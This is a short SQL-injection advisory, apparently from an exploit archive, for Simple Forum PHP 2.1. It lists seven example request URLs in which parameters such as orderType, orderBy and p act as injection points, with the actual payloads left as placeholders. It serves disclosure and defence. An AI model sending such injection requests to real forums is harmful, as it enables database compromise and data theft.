@@ -1,0 +1,15 @@
+source: http://www.securityfocus.com/bid/54024/info
+
+Simple Forum PHP is prone to multiple SQL-injection vulnerabilities because the application fails to properly sanitize user-supplied input before using it in an SQL query.
+
+A successful exploit could allow an attacker to compromise the application, access or modify data, or exploit vulnerabilities in the underlying database.
+
+Simple Forum PHP 2.1 is vulnerable; other versions may also be affected. 
+
+http://www.example.com/cms/forum.php?p=-1 [SQL-INJECTION]--
+http://www.example.com/cms/forum.php?orderType=-1 [SQL-INJECTION]--
+http://www.example.com/cms/forum.php?orderType=[ASC/DESC]&orderBy=-1 [SQL-INJECTION]--
+http://www.example.com/cms/forum/admin.php?act=topics&orderType=-1 [SQL-INJECTION]--
+http://www.example.com/cms/forum/admin.php?act=topics&orderType=[ASC/DESC]&search=&orderBy=-1 [SQL-INJECTION]--
+http://www.example.com/cms/forum/admin.php?act=replies&topic_id=&orderType=-1 [SQL-INJECTION]--
+http://www.example.com/cms/forum/admin.php?act=replies&topic_id=&orderType=[ASC/DESC]&search=&orderBy=-1 [SQL-INJECTION]-- 
